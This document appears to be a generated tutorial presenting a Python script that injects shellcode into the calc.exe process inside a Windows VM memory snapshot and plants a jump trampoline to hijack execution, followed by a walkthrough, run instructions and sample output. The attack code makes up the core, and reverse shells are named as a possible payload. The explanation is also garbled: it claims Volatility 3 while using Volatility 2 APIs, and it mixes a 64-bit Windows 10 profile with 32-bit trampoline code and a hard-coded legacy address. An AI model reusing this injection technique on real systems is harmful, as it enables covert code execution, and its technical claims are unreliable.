This Python script utilizes **Volatility 3** to interact with a memory dump (`Win10X64.vmem`), locates a target process (`calc.exe`), searches for unused memory space (slack space), and injects shellcode into that space. Additionally, it creates a trampoline to redirect execution to the injected shellcode.


```python
import sys
import struct
import volatility.conf as conf
import volatility.registry as registry
import volatility.commands as commands
import volatility.addrspace as addrspace
import volatility.plugins.taskmods as taskmods

equals_button = 0x01005D51

memory_file = "Win10X64.vmem"
slack_space = None
trampoline_offset = None

# read in our shellcode
with open("cmeasure.bin", "rb") as sc_fd:
    sc = sc_fd.read()
    
sys.path.append("/volatility3.1.0.0")

registry.PluginImporter()
config = conf.ConfObject()

config.parse_options()
config.PROFILE = "Win10X64"
config.LOCATION = f"file://{memory_file}"

registry.register_global_options(config, commands.Command)
registry.register_global_options(config, addrspace.BaseAddressSpace)

p = taskmods.PSList(config)

for process in p.calculate():
    if str(process.ImageFileName) == "calc.exe":
        print(f"[*] Found calc.exe with PID {process.UniqueProcessId}")
        print("[*] Hunting for physical offsets...please wait")
    
    address_space = process.get_process_address_space()
    pages = address_space.get_available_pages()
    
    for page in pages:
        physical = address_space.vtop(page[0])
        if physical is not None:
            if slack_space is None:
                
                with open(memory_file, "r+") as fd:
                    fd.seek(physical)
                    buf = fd.read(page[1])
                    try:
                        offset = buf.index("\x00" * len(sc))
                        slack_space = page[0] + offset
                        
                        print("[*] Found good shellcode location!")
                        print("[*] Virtual address: 0x%08x" % slack_space)
                        print("[*] Physical address: 0x%08x" % (physical + offset))
                        print("[*] Injecting shellcode.")
                        
                        fd.seek(physical + offset)
                        fd.write(sc.decode())
                        fd.flush()
                        
                        # create our trampoline
                        tramp = "\xbb%s" % struct.pack("<L", page[0] + offset)
                        tramp += "\xff\xe3"

                        if trampoline_offset is not None:
                            break
                    except:
                        pass
                        
                    # check for our target code location
                    if page[0] <= equals_button < ((page[0] + page[1]) - 7):
                        
                        # calculate virtual offset
                        v_offset = equals_button - page[0]
                        
                        # calculate physical offset
                        trampoline_offset = physical + v_offset
                        
                        print("[*] Found our trampoline target at: 0x%08x" % (
                            trampoline_offset))
                        if slack_space is not None:
                            break
            
            print("[*] Writing trampoline...")
            
            with open(memory_file, "r+") as fd:
                fd.seek(trampoline_offset)
                fd.write(tramp)
                fd.close()
                
            print("[*] Done injecting the code")
```

### Key Components:

1. **Imports**:
   - The script imports various Volatility 3 modules (`taskmods`, `conf`, `registry`, `addrspace`, etc.) to work with memory dumps, find processes, and manipulate the virtual address space.

2. **Shellcode**:
   - **`cmeasure.bin`**: The shellcode is read from a file named `cmeasure.bin`. This shellcode is injected into the memory dump at a location that is found to be unused.

3. **Memory File**:
   - **`memory_file = "Win10X64.vmem"`**: This is the path to the memory dump (a `.vmem` file). The script expects the memory file to be in the same directory or a path that is provided.

4. **Slack Space**:
   - The script attempts to find "slack space" in the memory dump. Slack space is unused memory within allocated regions that can be overwritten with custom code.

5. **Trampoline**:
   - A **trampoline** is a small piece of code that redirects the execution flow to the shellcode. The trampoline is injected into the memory dump at a location near the shellcode.

6. **Target Process (calc.exe)**:
   - The script targets `calc.exe` (the Windows calculator application) by checking the list of running processes and locating the process by its name.

### Script Workflow:

1. **Configuration**:
   - The configuration object is created and set up with the memory file (`Win10X64.vmem`) and the profile (`Win10X64`) for Windows 10 64-bit. Volatility will use this configuration to analyze the memory dump.

2. **Finding `calc.exe`**:
   - The script uses Volatility's `PSList` plugin to list all processes and search for `calc.exe`. If it finds the target process, it proceeds to analyze its address space.

3. **Scanning Memory Pages**:
   - The script scans the available memory pages of the process to find slack space, which is an unused portion of memory that can be overwritten with shellcode.

4. **Injecting Shellcode**:
   - Once slack space is located, the script writes the shellcode (`cmeasure.bin`) to this location in the memory dump.

5. **Creating Trampoline**:
   - The script calculates the physical address of the target code (like the `equals_button`) and writes a trampoline code to redirect execution to the shellcode. The trampoline consists of machine code that redirects the flow of execution to the injected shellcode.

6. **Writing the Shellcode and Trampoline**:
   - The shellcode is written to the slack space, and the trampoline code is written to the location that will redirect execution to the shellcode.

### How It Works:

1. **Find the Target Process**:
   - The script uses the `PSList` plugin from Volatility to list the running processes in the memory dump.
   - It searches for `calc.exe`, and once it finds the target process, it prints the PID (Process ID) and proceeds with memory manipulation.

2. **Scan Memory Pages for Slack Space**:
   - The script reads the memory pages allocated to the process and looks for unused memory (slack space).
   - The slack space is determined by searching for a block of memory filled with null bytes (`\x00`).

3. **Inject Shellcode**:
   - Once the slack space is identified, the script writes the shellcode (`cmeasure.bin`) to that memory location.

4. **Create Trampoline to Redirect Execution**:
   - The script looks for a specific memory location (e.g., `equals_button`), which represents a location in memory that can be overwritten with a jump instruction.
   - A trampoline is injected at this location to redirect execution to the shellcode.

5. **Write the Code**:
   - After finding the appropriate locations, the script writes the trampoline and shellcode to the memory dump.
   
6. **Execute the Script**:
   - After the script finishes writing, the shellcode will execute the payload, which can perform whatever action was defined in the shellcode (e.g., spawning a reverse shell).

### Important Notes:

- **Shellcode Injection**: This technique is commonly used for malware analysis, penetration testing, and reverse engineering. However, it's important to use it ethically and legally, with proper authorization.
- **Memory Dump Source**: To execute this script, you need to have a valid memory dump from a Windows machine. The memory dump is obtained using tools like FTK Imager or WinPMEM.
- **Physical and Virtual Address Space**: The script works with both virtual and physical addresses. Volatility helps translate between virtual and physical addresses to manipulate memory.
- **Trampoline Injection**: The trampoline technique is often used in exploits to redirect execution flow. This allows the shellcode to be executed even if the target process is running in a protected environment.

### How to Run:

1. **Install Volatility 3**:
   - Ensure that Volatility 3 is installed. You can install it from the official repository:
     ```bash
     git clone https://github.com/volatilityfoundation/volatility3.git
     cd volatility3
     pip install .
     ```

2. **Prepare Memory Dump**:
   - Ensure you have a memory dump (e.g., `Win10X64.vmem`) that the script can analyze.
   - Place the memory dump file in the same directory as the script or adjust the path in the script to point to the correct location.

3. **Prepare Shellcode**:
   - Make sure the shellcode file (`cmeasure.bin`) is available. This is the code that will be injected into the memory dump.

4. **Run the Script**:
   - Run the Python script to analyze the memory dump, inject the shellcode, and write the trampoline code.
     ```bash
     python inject_shellcode.py
     ```

5. **Verification**:
   - The script will print messages to the console when it finds `calc.exe`, slack space, and the trampoline target. It will also print memory addresses where the shellcode is injected.

### Example Output:
```
[*] Found calc.exe with PID 1234
[*] Hunting for physical offsets...please wait
[*] Found good shellcode location!
[*] Virtual address: 0x12345678
[*] Physical address: 0x23456789
[*] Injecting shellcode.
[*] Found our trampoline target at: 0x34567890
[*] Writing trampoline...
[*] Done injecting the code
```

### Ethical Considerations:

This script is intended for educational purposes, penetration testing, and malware analysis. It is **critical** to use this type of script in a legal and authorized manner. Unauthorized access or modification of computer systems is illegal and unethical. Always ensure that you have proper permission before performing such activities.
